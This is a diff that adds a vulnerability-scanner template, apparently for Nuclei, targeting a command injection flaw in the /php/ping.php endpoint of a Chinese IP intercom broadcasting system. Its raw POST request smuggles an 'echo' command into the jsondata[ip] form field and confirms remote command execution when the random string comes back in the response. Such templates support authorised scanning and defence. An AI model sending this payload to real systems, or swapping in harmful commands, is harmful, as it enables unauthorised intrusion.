@@ -1,0 +1,35 @@
+id: ip-network-intercom-broadcasting-ping-rce
+
+info:
+  name: IP网络对讲广播系统 /php/ping.php 远程命令执行
+  author: SleepingBag945
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /php/ping.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Origin: {{RootURL}}
+        Connection: close
+        Referer: {{RootURL}}/html/system.html
+        X-Forwarded-For: 127.0.0.1
+
+        jsondata[type]=3&jsondata[ip]=echo+{{randstr}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randstr}}"
+        part: body
+        condition: and
